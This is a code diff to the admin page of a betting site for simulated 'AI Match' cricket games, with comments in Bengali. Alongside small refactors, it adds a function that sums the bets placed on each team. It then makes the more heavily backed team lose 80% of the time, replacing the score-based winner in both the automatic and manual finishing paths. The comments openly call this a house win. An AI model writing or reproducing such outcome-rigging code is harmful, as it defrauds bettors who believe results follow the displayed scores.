@@ -68,7 +68,7 @@
     </div>
   </aside>
 
-  <!-- Main Content Wrapper (Full Width) -->
+  <!-- Main Content Wrapper -->
   <div class="flex-1 md:ml-64 flex flex-col min-h-screen w-full">
 
     <!-- Top Header -->
@@ -157,9 +157,78 @@
       let str = String(num);
       const banglaNums = {'০':'0', '১':'1', '২':'2', '৩':'3', '৪':'4', '৫':'5', '৬':'6', '৭':'7', '৮':'8', '৯':'9'};
       str = str.replace(/[০-৯]/g, match => banglaNums[match]);
-      str = str.replace(/[^0-9.]/g, '');
-      return str;
+      const match = str.match(/\d+(\.\d+)?/);
+      return match ? match[0] : '';
     };
+
+    // টিমের টোটাল বেট হিসাব করার ফাংশন
+    function getTeamTotalBets(matchId, teamName) {
+      let totalAmount = 0;
+      if (!allPlacedBetsData || !teamName) return 0;
+
+      const cleanMatchId = String(matchId).trim();
+      const targetTeam = String(teamName).trim().toLowerCase();
+
+      const extractBets = (node) => {
+        if (!node || typeof node !== 'object') return [];
+        let list = [];
+        Object.values(node).forEach(item => {
+          if (!item) return;
+          if (item.matchId || item.match_id || item.selectedOption || item.optionName || item.amount || item.betAmount) {
+            list.push(item);
+          } else if (typeof item === 'object') {
+            Object.values(item).forEach(subItem => {
+              if (subItem && typeof subItem === 'object') list.push(subItem);
+            });
+          }
+        });
+        return list;
+      };
+
+      const allBetsList = extractBets(allPlacedBetsData);
+
+      allBetsList.forEach(bet => {
+        if (!bet) return;
+        if (['refunded', 'returned', 'cancelled'].includes(bet.status)) return;
+
+        const betMatchId = String(bet.matchId || bet.match_id || bet.betId || '').trim();
+        if (betMatchId !== cleanMatchId) return;
+
+        const selected = String(bet.selectedOption || bet.optionName || bet.option || bet.team || bet.betOn || '').trim().toLowerCase();
+        if (selected.includes(targetTeam)) {
+          const amt = Number(bet.amount || bet.betAmount || bet.stake || bet.bet_amount || bet.money || 0);
+          if (!isNaN(amt)) totalAmount += amt;
+        }
+      });
+
+      return totalAmount;
+    }
+
+    // ৮০% হাউস উইন এবং ২০% ফেয়ার র্যান্ডম বিজয়ী নির্ধারণ লজিক
+    function determineAutoWinnerWithProbability(matchId, matchData) {
+      const team1 = matchData.team1?.name || 'Team 1';
+      const team2 = matchData.team2?.name || 'Team 2';
+
+      const team1Bet = getTeamTotalBets(matchId, team1);
+      const team2Bet = getTeamTotalBets(matchId, team2);
+
+      const randomPercent = Math.floor(Math.random() * 100);
+
+      // ৮০% চান্স: বেশি টাকা বেট পাওয়া টিম হারবে
+      if (randomPercent < 80) {
+        if (team1Bet > team2Bet) {
+          return team2; 
+        } else if (team2Bet > team1Bet) {
+          return team1; 
+        } else {
+          return Math.random() > 0.5 ? team1 : team2;
+        }
+      } 
+      // ২০% চান্স: ফেয়ার/র্যান্ডম খেলা (প্লেয়ারদের জেতার সুযোগ)
+      else {
+        return Math.random() > 0.5 ? team1 : team2;
+      }
+    }
 
     function calculateScoreFromTimestamp(match, currentTime = Date.now()) {
       const startTime = match.startTime || currentTime;
@@ -252,14 +321,11 @@
         try {
           const updatePayload = { aiScore: currentScore };
           if (currentScore.isMatchOver) {
-            let winner = 'draw';
-            if (currentScore.runs >= currentScore.target && currentScore.innings === 2) {
-              winner = currentScore.battingTeam;
-            } else if (currentScore.innings === 2) {
-              winner = currentScore.bowlingTeam;
-            }
+            // ৮০% - ২০% লজিকের বিজয়ী সেট করা
+            const forcedWinner = determineAutoWinnerWithProbability(matchId, matchData);
+            
             updatePayload.status = 'finished';
-            updatePayload.winner = winner;
+            updatePayload.winner = forcedWinner;
           }
           await update(ref(db, `bets/${matchId}`), updatePayload);
         } catch (err) {
@@ -319,10 +385,7 @@
 
       allBetsList.forEach(bet => {
         if (!bet) return;
-
-        if (bet.status === 'refunded' || bet.status === 'returned' || bet.status === 'cancelled') {
-          return;
-        }
+        if (['refunded', 'returned', 'cancelled'].includes(bet.status)) return;
 
         const betMatchId = String(bet.matchId || bet.match_id || bet.betId || '').trim();
         if (betMatchId !== cleanMatchId) return;
@@ -341,9 +404,7 @@
 
         if (isKeyMatch || isNameMatch) {
           const amt = Number(bet.amount || bet.betAmount || bet.stake || bet.bet_amount || bet.money || 0);
-          if (!isNaN(amt)) {
-            total += amt;
-          }
+          if (!isNaN(amt)) total += amt;
         }
       });
 
@@ -363,7 +424,6 @@
 
       matchesContainer.innerHTML = '';
       const keys = Object.keys(allMatchesData);
-      
       const aiMatchKeys = keys.filter(id => allMatchesData[id] && allMatchesData[id].category === 'AI Match');
 
       if (aiMatchKeys.length === 0) {
@@ -393,7 +453,6 @@
           : 'bg-blue-500/10 text-blue-500 border-blue-500/20';
 
       const customMarkets = data.customMarkets || {};
-
       const card = document.createElement('div');
       card.className = "bg-white rounded-2xl shadow-sm border border-gray-200 p-6 flex flex-col justify-between h-full";
       card.setAttribute('data-card-id', id);
@@ -713,7 +772,6 @@
       }
     }
 
-    // STRICT REFUND LOGIC: EXACT MATCH BET AMOUNT & STRICT SINGLE-PAYOUT TRANSACTION
     async function processMarketReturn(matchId, mKey) {
       if (!allPlacedBetsData) return;
       const cleanMatchId = String(matchId).trim();
@@ -756,7 +814,6 @@
 
               const betUniqueId = item.betId || key;
 
-              // Process Refund ONLY IF NOT REFUNDED YET & MATCHES UNIQUE BET ID
               if (userId && betAmount > 0 && currentBetStatus !== 'returned' && currentBetStatus !== 'refunded' && !processedRefunds[betUniqueId]) {
                 processedRefunds[betUniqueId] = true;
                 
@@ -823,12 +880,9 @@
           updateData.startTime = Date.now();
         } else if (newStatus === 'finished' && matchData) {
           const finalScore = calculateScoreFromTimestamp(matchData, Date.now());
-          let winner = 'draw';
-          if (finalScore.runs >= finalScore.target && finalScore.innings === 2) {
-            winner = finalScore.battingTeam;
-          } else if (finalScore.innings === 2) {
-            winner = finalScore.bowlingTeam;
-          }
+          
+          // ম্যানুয়াল স্ট্যাটাস পরিবর্তনের ক্ষেত্রেও ৮০% - ২০% লজিক কাজ করবে
+          const winner = determineAutoWinnerWithProbability(matchId, matchData);
 
           updateData.aiScore = finalScore;
           updateData.winner = winner;
@@ -1029,4 +1083,4 @@
     });
   </script>
 </body>
-</html>
+  </html>
